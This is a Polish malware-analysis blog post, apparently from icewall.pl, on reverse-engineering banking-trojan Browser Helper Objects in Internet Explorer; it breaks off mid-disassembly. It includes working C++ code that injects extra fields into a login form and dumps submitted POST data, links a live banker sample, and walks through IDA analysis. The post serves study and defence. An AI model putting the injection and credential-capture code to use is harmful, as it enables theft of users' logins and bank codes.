{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-07 05:27:17","updatedTime":"2020-09-07 05:27:17","title":"Reversowanie BHO","link":"http://www.icewall.pl/?p=622","description":"<p>Od dawien dawna po dzień dzisiejszy (BHO wpierane jest od IE 4.0) autorzy malware’u wykorzystują funkcjonalność jaką dostarcza im BHO do znęcania się nad użytkownikami IE.<br />\nPrzeważnie złośliwe BHO posiada dwie kluczowe funkcjonalności (na pewno w przypadku banker’a) :</p>\n<pre>\n-  monitorowania/logowania zapytań wysyłanych przez przeglądarkę \n\tPOST dump – kradzież haseł\n– dynamiczne modyfikowania kodu html wybranych stron\n\tHTML code injection – wstrzyknięcie kodu html np. dodającego pare dodatkowych pól \nw formularzu przeznaczonych do wpisania większej ilości kodów TAN\n</pre>\n<p><strong><font color=\"blue\">=] Tworzenie BHO [=</font></strong><br />\nImplementacje dll’ki można wykonać na kilka sposobów:</p>\n<p><strong>Czysty COM/WinApi</strong><br />\n    Oczywiście jak można się domyślać w tym przypadku implementacja wszystkich niezbędnych interfejsów COM’wych będzie należała do nas. Jest to jednak, doskonały sposób na dokładne zapoznanie się mechanizmami, które kryją się pod maską BHO.<br />\nSzczegółowy tutorial jak napisać BHO bez wykorzystania MFC/ATL z wyjaśnieniem podstaw związanych z technologią COM znajduję się tutaj : <a href=\"http://www.codeproject.com/KB/shell/BHOinCPP.aspx\" target=\"_blank\">http://www.codeproject.com/KB/shell/BHOinCPP.aspx</a></p>\n<p><strong>MFC</strong></p>\n<p><strong>ATL</strong><br />\nW przypadku skorzystania z dobrodziejstwa biblioteki ATL do implementacji pozostaje nam tak naprawdę jedna metoda plus event handlery. Tutorial jak stworzyć BHO z wykorzystaniem ATL znajduję się tutaj:<br />\n<a href=\"http://msdn.microsoft.com/en-us/library/bb250489(v=vs.85).aspx\" target=\"_blank\">http://msdn.microsoft.com/en-us/library/bb250489(v=vs.85).aspx</a></p>\n<p><strong>Jak przebiega wywołanie kolejnych interfejsów oraz ich metod:</strong><br />\nW wielkim skrócie:<br />\n<strong>Ole32.dll  w IE</strong><br />\nCoGetClassObject->CoLoadLibrary<br />\n<strong>BHO</strong><br />\n@export DllGetClassObject &#8211; przekazanie pointer’a na coclass IClassFactory<br />\nIClassFactory->CreateInstance &#8211; przekazanie pointera na coclass IObjectWithSite<br />\nIObjectWithSite->SetSite -uzyskanie pointera do interfejsu IWebBrowser2<br />\nIWebBrowser2->QueryInterface dla IConnectionPointContainer<br />\nIConnectionPointContainer-> FindConnectionPoint dla dispatchera DWebBrowserEvents2<br />\nIConnectionPointContainer->Advise – rejestracja coclassy implementującej dispatcher DWebBrowserEvents2 (obsługa eventów)</p>\n<p><strong><font color=\"blue\">=] Interfejsy [=</font></strong><br />\nNas jak i zarówno twórców malware’u, intersować bedą tutaj w szczególności dwa interfejsy:<br />\n&#8211; <a href=\"http://msdn.microsoft.com/en-us/library/aa752127(VS.85).aspx\" target=\"_blank\">IWebBrowser2 </a><br />\n&#8211; <a href=\"http://msdn.microsoft.com/en-us/library/aa768283(v=vs.85).aspx\" target=\"_blank\">DWebBrowserEvents2</a> </p>\n<p><strong><font color=\"blue\">=] Obsługa eventów [=</font></strong><br />\nJak można się domyślać, główny kod malwareu odpowiadający za takie akcje jak HTLM Code injection czy POST dump będzie znajdował się w klasie implementującej interfejs DWebBrowserEvents2, odpowiedzialnej za obsługę eventów.<br />\nI tak , <strong>HTML Code injection </strong>można spodziewać się przy obsłudze eventu:<br />\n<strong>DISPID_DOCUMENTCOMPLETE :</strong><br />\n<em> „DocumentComplete  &#8211;\t Fires when a document is completely loaded and initialized.”</em></p>\n<p><strong>POST Dump ( kradzież login/pass)</strong><br />\n<strong>DISPID_BEFORENAVIGATE2:</strong><br />\n<em>„BeforeNavigate2 &#8211; Fires before navigation occurs in the given object (on either a window element or a frameset element).”</em></p>\n<p>Rzućmy okiem jak wygląda szczątkowa implementacja takiej klasy w cpp:<br />\n<strong>Czysty COM/WinAPI</strong></p>\n<pre class=\"brush: cpp; title: ; notranslate\">\nclass CEvents : public DWebBrowserEvents2 {\npublic:\nSTDMETHODIMP Invoke(DISPID dispIdMember,REFIID riid,LCID lcid,WORD wFlags,DISPPARAMS *pDispParams,VARIANT *pVarResult,EXCEPINFO *pExcepInfo,UINT *puArgErr);\nprivate:\nvoid OnBeforeNavigate2(...);\nvoid OnDocumentComplete(...);\n};\n\nSTDMETHODIMP CEvents::Invoke(DISPID dispIdMember,REFIID riid,LCID lcid,WORD wFlags,DISPPARAMS *pDispParams,VARIANT *pVarResult,EXCEPINFO *pExcepInfo,UINT *puArgErr)\n{\nswitch(dispIdMember)\n{\n    case DISPID_DOCUMENTCOMPLETE:\nOnDocumentComplete(...);\n\tbreak;\n\n    case DISPID_BEFORENAVIGATE2:\nOnBeforeNavigate2(...);\n\tbreak;\n}\n}\n</pre>\n<p><strong>ATL</strong></p>\n<pre class=\"brush: cpp; title: ; notranslate\">\nclass ATL_NO_VTABLE CCBHO :\n\tpublic CComObjectRootEx&#60;CComSingleThreadModel&#62;,\n\tpublic CComCoClass&#60;CCBHO, &#38;CLSID_CBHO&#62;,\n\tpublic IObjectWithSiteImpl&#60;CCBHO&#62;,\n\tpublic IDispatchImpl&#60;ICBHO, &#38;IID_ICBHO, &#38;LIBID_firstBHOLib, /*wMajor =*/ 1, /*wMinor =*/ 0&#62;,\n\tpublic IDispEventImpl&#60;1, CCBHO, &#38;DIID_DWebBrowserEvents2, &#38;LIBID_SHDocVw, 1, 1&#62;\n{\npublic:\n\tCCBHO()\n\t{\n\t}\n\n\npublic:\n\tBEGIN_SINK_MAP(CCBHO) //initialize _ATL_EVENT_ENTRY structure \n\t\tSINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_DOCUMENTCOMPLETE, OnDocumentComplete)\n\t\tSINK_ENTRY_EX(1, DIID_DWebBrowserEvents2, DISPID_BEFORENAVIGATE2, OnBeforeNavigate)\n\tEND_SINK_MAP()\n\n    // DWebBrowserEvents2\n    void STDMETHODCALLTYPE OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL);\n\tvoid STDMETHODCALLTYPE OnBeforeNavigate(IDispatch *pDisp,    \n\t\t\t\t\t\t\t\t\t\t\tVARIANT *url,\n\t\t\t\t\t\t\t\t\t\t\tVARIANT *Flags,\n\t\t\t\t\t\t\t\t\t\t\tVARIANT *TargetFrameName,\n\t\t\t\t\t\t\t\t\t\t\tVARIANT *PostData,\n\t\t\t\t\t\t\t\t\t\t\tVARIANT *Headers,\n\t\t\t\t\t\t\t\t\t\t\tVARIANT_BOOL *Cancel);\n</pre>\n<p>Tak jak wspomniałem powyżej, dość kluczową rolę w funkcjonowaniu malwareu w postaci BHO będzie miał kod znajdujący się przy obsłudze eventów <strong>BEFORENAVIGATE2 i DOCUMENTCOMPLETE</strong>. Zanim jednak weźmiemy pod lupę przykładowy malware, rzućmy okiem na implementacje <strong>HTML Code injection</strong> oraz <strong>POST dump</strong> w <strong>CPP</strong>.</p>\n<p><strong>HTML Code injection (ATL)</strong></p>\n<pre class=\"brush: cpp; title: ; notranslate\">\nvoid STDMETHODCALLTYPE CCBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)\n{\n\tHRESULT hr;\n    // Retrieve the top-level window from the site.\n\tCComQIPtr&#60;IWebBrowser2&#62; tmpBrowser = pDisp;\n\tif(tmpBrowser &#38;&#38; m_webBrowser &#38;&#38; m_webBrowser.IsEqualObject(tmpBrowser))\n\t{\n\t\tCComPtr&#60;IDispatch&#62; doc;\n\t\thr = m_webBrowser-&#62;get_Document(&#38;doc);\n\t\tif(SUCCEEDED(hr))\n\t\t{\n\t\t\tCComQIPtr&#60;IHTMLDocument2&#62; html = doc;\n\t\t\tif( html != NULL)\n\t\t\t{\n\t\t\t\tdebug_init();\n\t\t\t\t//check target url\n\t\t\t\tif(wcsstr((WCHAR*)pvarURL-&#62;pbstrVal,L&#34;http://www.icewall.pl/wp-login.php&#34;))\n\t\t\t\t{\n\t\t\t\t\tdebug(&#34;[+] Target URL detected&#34;);\n\t\t\t\t\tCComPtr&#60;IHTMLElement&#62; body;\n\t\t\t\t\thr = html-&#62;get_body(&#38;body);\n\t\t\t\t\tif(!SUCCEEDED(hr) || body == NULL)\n\t\t\t\t\t\treturn;\n\t\t\t\t\tdebug(&#34;[+] Make simple html code injection, right after &#60;body&#62; tag&#34;);\n\t\t\t\t\tbody-&#62;insertAdjacentHTML(L&#34;afterBegin&#34;,L&#34;&#60;h1 style=\\&#34;text-align:center;color:red;\\&#34;&#62;Injected Code&#60;/h1&#62;&#34;);\n\t\t\t\t\t\n\t\t\t\t\tdebug(&#34;[+] Find login form&#34;);\n\t\t\t\t\tCComPtr&#60;IHTMLElementCollection&#62; forms;\n\t\t\t\t\thr = html-&#62;get_forms(&#38;forms);\n\t\t\t\t\tif(!SUCCEEDED(hr) || forms == NULL)\n\t\t\t\t\t\treturn;\n\t\t\t\t\t\n\t\t\t\t\tlong amount = 0;\n\t\t\t\t\tCComVariant name;\n\t\t\t\t\tCComPtr&#60;IDispatch&#62; pDisp;\n\t\t\t\t\tforms-&#62;get_length(&#38;amount);\n\t\t\t\t\tfor(int i =0; i &#60; amount;i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tCComVariant index(i);\n\t\t\t\t\t\tforms-&#62;item(name,index,&#38;pDisp);\n\t\t\t\t\t\tCComQIPtr&#60;IHTMLElement&#62; form = pDisp;\n\t\t\t\t\t\tdebug(&#34;[+] Injecting additional form field&#34;);\n\t\t\t\t\t\tform-&#62;insertAdjacentHTML(L&#34;afterBegin&#34;,\n\t\t\t\t\t\t\tL&#34;&#60;label&#62;Phone number&#60;br /&#62;&#60;input type=\\&#34;text\\&#34; name=\\&#34;phone\\&#34; class=\\&#34;input\\&#34; size=\\&#34;20\\&#34;/&#62;&#60;/label&#62;&#34;);\n\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t}\n\t\t}\n\t}\n}\n</pre>\n<p>A tak wyglada efekt:<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg\" alt=\"\" title=\"code_injection\" width=\"1186\" height=\"540\" class=\"aligncenter size-full wp-image-646\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg 1186w, http://www.icewall.pl/wp-content/uploads/2012/01/code_injection-300x136.jpg 300w, http://www.icewall.pl/wp-content/uploads/2012/01/code_injection-1024x466.jpg 1024w\" sizes=\"(max-width: 1186px) 100vw, 1186px\" /></a><br />\nJak widać na screen&#8217;e do kodu strony został wstrzykniety napis <strong>&#8222;Injected code&#8221;</strong> oraz dodatkowe pole formularza <strong>&#8222;Phone number&#8221;</strong>.<br />\nOk, rzucmy okiem na kod wykonujacy <strong>POST dump’a:</strong></p>\n<pre class=\"brush: cpp; title: ; notranslate\">\nvoid STDMETHODCALLTYPE CCBHO::OnBeforeNavigate(IDispatch *pDisp,    \n\t\t\t\t\t\t\t\t\t\tVARIANT *url,\n\t\t\t\t\t\t\t\t\t\tVARIANT *Flags,\n\t\t\t\t\t\t\t\t\t\tVARIANT *TargetFrameName,\n\t\t\t\t\t\t\t\t\t\tVARIANT *PostData,\n\t\t\t\t\t\t\t\t\t\tVARIANT *Headers,\n\t\t\t\t\t\t\t\t\t\tVARIANT_BOOL *Cancel)\n{\n    if (PostData != NULL &#38;&#38; PostData-&#62;vt == (VT_VARIANT|VT_BYREF) &#38;&#38; PostData-&#62;pvarVal-&#62;vt != VT_EMPTY )\n\t{\n\t\tdebug(&#34;[+] POST data dump&#34;);\n\t\t//dump information about URL\n\t\tdebug(std::string(CW2A(url-&#62;bstrVal)));\n\t\t\n\t\tchar *szTemp = NULL;\n\t\tchar *szPostData = NULL;\n\t\tlong plLbound, plUbound;\n\t\t\n\t\tSAFEARRAY *parrTemp = PostData-&#62;pvarVal-&#62;parray;\n\t\tSafeArrayAccessData(parrTemp , (void HUGEP **) &#38;szTemp);\n\t\t\n\t\tSafeArrayGetLBound(parrTemp , 1, &#38;plLbound);\n\t\tSafeArrayGetUBound(parrTemp , 1, &#38;plUbound);\n\t\t\n\t\tszPostData = new char[plUbound - plLbound + 2];\n\t    memcpy(szPostData, szTemp, plUbound - plLbound + 1);\n\t\tszPostData[plUbound-plLbound] = '&#92;&#48;';\n\t\tSafeArrayUnaccessData(parrTemp);\n\t\t\n\t\t//dump post data\n\t\tdebug(szPostData);\n\t\t\n\t\tdelete[] szPostData;\n\t}\n}\n</pre>\n<p>Wypelniamy forme:<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump1.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump1.jpg\" alt=\"\" title=\"postdump1\" width=\"891\" height=\"546\" class=\"aligncenter size-full wp-image-648\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump1.jpg 891w, http://www.icewall.pl/wp-content/uploads/2012/01/postdump1-300x183.jpg 300w\" sizes=\"(max-width: 891px) 100vw, 891px\" /></a><br />\nLogin&#8230;<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump2.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump2.jpg\" alt=\"\" title=\"postdump2\" width=\"892\" height=\"616\" class=\"aligncenter size-full wp-image-649\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/postdump2.jpg 892w, http://www.icewall.pl/wp-content/uploads/2012/01/postdump2-300x207.jpg 300w\" sizes=\"(max-width: 892px) 100vw, 892px\" /></a></p>\n<p>Jak widać, wszystkie dane wpisane w polach formularza (wraz z tymi wpisanymi do pola, które została wstrzyknięte przez nasze BHO) zostały zdumpowane na konsole.<br />\nSkoro już wiemy jakiego kodu możemy się spodziewać i mamy świadomość jak on funkcjonuje, rzućmy okiem na realny przykład.</p>\n<p><strong><font color=\"blue\">=] Just reverse it! [=</font></strong><br />\n<strong>Malware: </strong>Trojan-Spy.Win32.Banker<br />\n<strong>MD5:</strong>  4bb6988207b7e64c91181ab3a7a82e3e<br />\n<strong>SHA256:</strong> d02323c52b3142ffbfc2a8d92a4202022d2671ba18b4efbe7569863817e550e6<br />\n<a href=\"https://www.virustotal.com/file/d02323c52b3142ffbfc2a8d92a4202022d2671ba18b4efbe7569863817e550e6/analysis/\" target=\"_blank\">https://www.virustotal.com/ &#8211; report</a><br />\n<strong>Download:</strong>  <a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/Trojan-Spy.Win32.Banker.zip\" target=\"_blank\">Trojan-Spy.Win32.Banker </a><strong>pass: infected</strong></p>\n<p>Plik reprezentowany przez powyżej przedstawione hashe jest tak naprawdę droperem, a nas będzie jedynie interesowała dll’ka, która dropuje do system32 czyli <strong>btask.dll (BHO).</strong></p>\n<p>Jak pewnie zauważyliście dll’ka spakowana jest upx&#8217;em, warto rozpakować dll’ke i pracować na rozpakowanej wersji nawet przy dynamicznej analizie.</p>\n<p><strong><font color=\"blue\">=] Gdzie te event handler’y ?[=</font></strong><br />\nUstaliliśmy już, że złowieszcze funkcje typowe dla banker’a w postaci BHO znajdują się przy obsłudzę eventów. Teraz pytanie brzmi jak znaleźć te fragmenty kodu, a tak naprawdę jak odnaleźć funkcję<br />\n<strong>Invoke() (dla czystego COM/winapi) </strong>czy <strong>inicjalizację struktur  _ATL_EVENT_ENTRY</strong> gdzie znajdować się będą wszystkie interesujące nas informacje i fragmenty kodu?</p>\n<p><strong><font color=\"blue\">=] Wyszukiwanie stałych [=</font></strong><br />\nDobre rezultaty daje tutaj proste wyszukiwanie wartości stałych, które reprezentują poszczególne eventy:</p>\n<p><a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/events.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/events.jpg\" alt=\"\" title=\"events\" width=\"783\" height=\"160\" class=\"aligncenter size-full wp-image-652\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/events.jpg 783w, http://www.icewall.pl/wp-content/uploads/2012/01/events-300x61.jpg 300w\" sizes=\"(max-width: 783px) 100vw, 783px\" /></a></p>\n<p><strong>IDA->Alt+I (Find all occurences)</strong> , znajdźmy wszystkie stałe wartości równe <strong>259(0x103)</strong> reprezentujące event <strong>DOCUMENTCOMPLETE</strong>.</p>\n<pre class=\"brush: plain; title: ; notranslate\">\nAddress        Function     Instruction                                      \n-------        --------     -----------                                      \n.text:20004904 sub_2000480A cmp     eax, 103h\n.text:2000B0E3 sub_2000B093 cmp     [ebp+var_18], 103h                       \n</pre>\n<p>Zobaczmy pierwszy adres:<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/invoke.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/invoke.jpg\" alt=\"\" title=\"invoke\" width=\"1111\" height=\"466\" class=\"aligncenter size-full wp-image-653\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/invoke.jpg 1111w, http://www.icewall.pl/wp-content/uploads/2012/01/invoke-300x125.jpg 300w, http://www.icewall.pl/wp-content/uploads/2012/01/invoke-1024x429.jpg 1024w\" sizes=\"(max-width: 1111px) 100vw, 1111px\" /></a></p>\n<p>Kod wygląda bardzo sensownie, widać sporą dawkę instrukcji warunkowych i porównań jednego argumentu funkcji do różnych stałych, co może świadczyć o tym, że faktycznie udało nam się odszukać funkcję <strong>Invoke</strong>. I tak też jest ;).  Jeżeli, ktoś jeszcze tego nie dostrzegł to podpowiem, że można tutaj dostrzec typową implementację funkcji Invoke w przypadku kiedy NIE zastosowano ATL’owego szablonu. A jak wygląda sytuacja w przypadku ATL’a ?</p>\n<p><strong>atlBHO.dll (analiza dla ułatwienia z załadowanym plikiem pdb)</strong> &#8211; > <a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/atlBHO.zip\">Download</a><br />\nTym razem próbując znaleźć miejsce w kodzie gdzie inicjalizowana jest tablica struktur _ATL_EVENT_ENTRY posługując się w tym przypadku wartością 0x130 zaliczymy fail’a z tego względu, że pierwsza struktura w tej tablicy ( w moim kodzie jest to struktura dla eventu DOCUMENTCOMPLETE) jest częściowo zainicjalizowana przez co IDA wskaże nam miejsce:</p>\n<pre class=\"brush: cpp; title: ; notranslate\">\n.data:1003D770 ; ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; map[3]\n.data:1003D770 struct ATL::_ATL_EVENT_ENTRY&#60;class CCBHO&#62; const * const `public: static struct ATL::_ATL_EVENT_ENTRY&#60;class CCBHO&#62; const * __cdecl CCBHO::_GetSinkMap(void)'::`2'::map dd 1                    ; nControlID\n.data:1003D770                                         ; DATA XREF: CCBHO::_GetSinkMap(void):loc_1001C040o\n.data:1003D770                 dd offset _DIID_DWebBrowserEvents2; piid\n.data:1003D770                 dd 0Ch                  ; nOffset\n.data:1003D770                 dd 103h                 ; dispid\n.data:1003D770                 dd 0                    ; pfn\n.data:1003D770                 db 4 dup(0)\n.data:1003D770                 dd 0                    ; pInfo\n.data:1003D770                 db 4 dup(0)             ; _padding\n.data:1003D770                 dd 0                    ; nControlID\n...\n</pre>\n<p>czyli przestrzeń statycznie zaalokowaną na tablice<strong> _ATL_EVENT_ENTRY</strong>. My jednak szukamy miejsca w kodzie gdzie następuje inicjalizacja tej tablicy. Poszukajmy więc wartości odpowiadającej event’owi<br />\n<strong>BEFORENAVIGATE2</strong> czyli <strong>0xFA</strong></p>\n<pre class=\"brush: cpp; title: ; notranslate\">\n.text:1001BF29                 mov     [ebp+var_EC], offset CCBHO::OnDocumentComplete(IDispatch *,tagVARIANT *)\n(...)\n.text:1001BF9E                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.nOffset+20h, edx\n.text:1001BFA4                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.dispid+20h, 0FAh\n.text:1001BFAE                 mov     [ebp+var_DC], offset CCBHO::OnBeforeNavigate(IDispatch *,tagVARIANT *,tagVARIANT *,tagVARIANT *,tagVARIANT *,tagVARIANT *,short *)\n.text:1001BFB8                 mov     [ebp+var_D8], 0\n.text:1001BFC2                 mov     eax, [ebp+var_DC]\n.text:1001BFC8                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.pfn+20h, eax\n.text:1001BFCD                 mov     ecx, [ebp+var_D8]\n.text:1001BFD3                 mov     dword ptr ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map+34h, ecx\n.text:1001BFD9                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.pInfo+20h, 0\n.text:1001BFE3                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.nControlID+40h, 0\n.text:1001BFED                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.piid+40h, 0\n.text:1001BFF7                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.nOffset+40h, 0\n.text:1001C001                 mov     ATL::_ATL_EVENT_ENTRY&#60;CCBHO&#62; const * const `CCBHO::_GetSinkMap(void)'::`2'::map.dispid+40h, 0\n</pre>\n<p>Bingo!  Pod adresem <strong>1001BF29</strong> oraz <strong>1001BFAE</strong> widzimy inicjalizację struktur offset’ami na event handlery. Mamy, więc trywialny sposób na odnalezienie interesujących nas fragmentów kodu w obu przypadkach. Zautomatyzujmy ten proces.</p>\n<p><strong>IDA Python</strong> &#8211; > Download <a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/bho.zip\">BHO.py</a><br />\nStworzyłem prosty skrypt, który bazując na paru najpopularniejszych stałych reprezentujących event’y odnajduje miejsce funkcji <strong>Invoke</strong> czy <strong>inicjalizacji tablicy _ATL_EVENT_ENTRY</strong>.<br />\nWróćmy do naszego malwareu i odpalmy skrypt.</p>\n<pre class=\"brush: plain; title: ; notranslate\">\nSearching for DISPID_BEFORENAVIGATE2\nSearching for DISPID_DOCUMENTCOMPLETE\nSearching for DISPID_NAVIGATECOMPLETE2\nSearching for DISPID_ONQUIT\nPotential Invoke function 0x20003b22 : appearance 1\nPotential Invoke function 0x20013043 : appearance 1\nPotential Invoke function 0x200044cc : appearance 1\nPotential Invoke function 0x2000480a : appearance 4\nPotential Invoke function 0x20004eec : appearance 1\nPotential Invoke function 0x200074f1 : appearance 1\nPotential Invoke function 0x2000b093 : appearance 1\nPotential Invoke function 0x200022fa : appearance 1\nSuggested address of Invoke function : 0x2000480a\n</pre>\n<p>Jak widać skrypt spisał się bardzo dobrze, ponieważ <strong>0x2000480a</strong>jest faktycznym adresem funkcji Invoke, który udało nam się wcześniej ustalić ręcznie.<br />\n<strong>Bho.py</strong> posiada jeszcze jedna użyteczna opcje, a mianowicie funkcję<strong> bho_invoke(ea)</strong> (gdzie ea to adres funkcji invoke lub init _ATL_EVENT_ENTRY), która doda komentarze zawierające opisy każdej stałej w miejscu jej występowania.</p>\n<pre class=\"brush: plain; title: ; notranslate\">\nPython&#62;bho_invoke(0x2000480a)\nFound DISPID_NAVIGATECOMPLETE2 at: 200048bb\nFound DISPID_NAVIGATEANDFIND at: 200048d0\nFound DISPID_PROGRESSCHANGE at: 20004825\nFound DISPID_DOCUMENTCOMPLETE at: 20004904\nFound DISPID_BEFORENAVIGATE2 at: 200048c6\nFound DISPID_ONQUIT at: 200049d7\nFound DISPID_DOWNLOADCOMPLETE at: 2000481c\nFound DISPID_ISSUBSCRIBED at: 200048d0\n</pre>\n<p>Zobaczmy efekt:<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg\" alt=\"\" title=\"commented_invoke\" width=\"1111\" height=\"466\" class=\"aligncenter size-full wp-image-657\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg 1111w, http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke-300x125.jpg 300w, http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke-1024x429.jpg 1024w\" sizes=\"(max-width: 1111px) 100vw, 1111px\" /></a><br />\nMożemy teraz przystąpić do reversowania poszczególnych event handlerów.</p>\n<p><strong><font color=\"blue\">=] Reversowanie kodu zawierającego wywołania interfejsów COM [=</font></strong><br />\nBez odpowiedniego podejścia i jeszcze paru zabiegów, reversowanie takiego kodu może być mocno uciążliwe. Dlatego też, polecam kilka skryptów stworzonych przez <a href=\"http://reconstructer.org/code.html\">Frank’a Boldewin’a</a> :<br />\n<a href=\"http://reconstructer.org/code/ClassAndInterfaceToNames.zip\">ClassAndInterfaceToNames.zip </a>&#8211; odnajdywanie UUID’ów class i interfejsów<br />\n<a href=\"http://reconstructer.org/code/VtablesStructuresFromPSDK2003R2.zip\">VtablesStructuresFromPSDK2003R2.zip</a> &#8211; skrypt dodający struktury vtable powiązane z interfejsami COM.<br />\n<a href=\"http://reconstructer.org/papers/Practical%20COM%20code%20reconstruction.swf \" target=\"_blank\">Practical%20COM%20code%20reconstruction.swf</a> – video prezentujące: reversowanie COM’wego kodu + zalety skorzystania z dwóch powyższych skryptów.</p>\n<p>Żeby zobaczyć różnice jak i zalety zastosowania powyższych skryptów spróbujmy zreversować następujący kawałek kodu pochodzący z event handler’a <strong>OnDocumentComplete</strong>:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n.text:200028F9                 mov     eax, [ebp+arg_8]\n.text:200028FC                 xor     ebx, ebx\n.text:200028FE                 cmp     eax, ebx\n.text:20002900                 jz      loc_20002AC5\n.text:20002906                 mov     ecx, [eax]\n.text:20002908                 lea     edx, [ebp+var_18]\n.text:2000290B                 push    edx\n.text:2000290C                 push    offset unk_200180E8\n.text:20002911                 push    eax\n.text:20002912                 mov     [ebp+var_18], ebx\n.text:20002915                 call    dword ptr [ecx]\n</pre>\n<p>Widać tutaj wywołanie jakieś metody wirtualnej tylko pytanie jakiego interfejsu i co dokładnie jest argumentem pod tym offset’em <strong>unk_200180E8</strong> ?<br />\nUżyjmy skryptu <strong>ClassAndInterfaceToNames</strong>, a oto efekt:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n.text:200028F9                 mov     eax, [ebp+arg_8]\n.text:200028FC                 xor     ebx, ebx\n.text:200028FE                 cmp     eax, ebx\n.text:20002900                 jz      loc_20002AC5\n.text:20002906                 mov     ecx, [eax]\n.text:20002908                 lea     edx, [ebp+var_18]\n.text:2000290B                 push    edx\n.text:2000290C                 push    offset IID_IWebBrowser2__2\n.text:20002911                 push    eax\n.text:20002912                 mov     [ebp+var_18], ebx\n.text:20002915                 call    dword ptr [ecx]\n</pre>\n<p>Ahh już lepiej, teraz patrząc na nasz kod w CPP zauważamy analogię, że na wstępie interfejs <strong>IDispatch</strong> wywołuje <strong>QueryInterface</strong> z argumentami :</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n  IID_IWebBrowser2,\n (void **)&#38;pWebBrowser)\n( ta linijka ukrywa się tutaj CComQIPtr&#60;IWebBrowser2&#62; tmpBrowser = pDisp; )\n</pre>\n<p>żeby uzyskać pointer na <strong>coclass IWebBrowser</strong>. Wnioskując z tego, mamy iż:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n[ebp+var_18] to [ebp+IWebBrowser]\n</pre>\n<p>a</p>\n<pre class=\"brush: plain; title: ; notranslate\">\ncall    dword ptr [ecx] to (naciskamy na ecx T i szukamy IDispatch) \ncall    dword ptr [ecx+ IDispatchVtbl.QueryInterface]\n</pre>\n<p>efekt końcowy:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n.text:200028F9                 mov     eax, [ebp+arg_8]\n.text:200028FC                 xor     ebx, ebx\n.text:200028FE                 cmp     eax, ebx\n.text:20002900                 jz      loc_20002AC5\n.text:20002906                 mov     ecx, [eax]\n.text:20002908                 lea     edx, [ebp+IWebBrowser]\n.text:2000290B                 push    edx\n.text:2000290C                 push    offset IID_IWebBrowser2__2\n.text:20002911                 push    eax\n.text:20002912                 mov     [ebp+IWebBrowser], ebx\n.text:20002915                 call    [ecx+IDispatchVtbl.QueryInterface]\n</pre>\n<p>Itd&#8230; Ok, ale co jeśli chcemy wykonać dynamiczną analizę? Ofc, możemy przeanalizować w podany powyżej sposób kod statycznie, jednak takie podejście czasami wymaga uzupełnienia z różnych względów, czyli właśnie dynamicznej analizy.<br />\nNiestety pojawia się tu pewien problem, ponieważ <strong>SHDOCVW.dll</strong>, do której odwoływać się będzie większość call&#8217;i powiązanych z interfejsami COM w naszym przypadku<br />\n<img src=\"http://i.msdn.microsoft.com/dynimg/IC16039.gif\" alt=\"\" /><br />\n<em>źródło http://msdn.microsoft.com/en-us/library/ie/aa741313(v=vs.85).aspx</em></p>\n<p>, nie ma ujawnionych „czytelnych” nazw dla większości exportów. I w miejscu takim jak:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n010328F9  |.  8B45 10       MOV EAX,[ARG.3]\n010328FC  |.  33DB          XOR EBX,EBX\n010328FE  |.  3BC3          CMP EAX,EBX\n01032900  |.  0F84 BF010000 JE btask.01032AC5\n01032906  |.  8B08          MOV ECX,DWORD PTR DS:[EAX]\n01032908  |.  8D55 E8       LEA EDX,[LOCAL.6]\n0103290B  |.  52            PUSH EDX\n0103290C  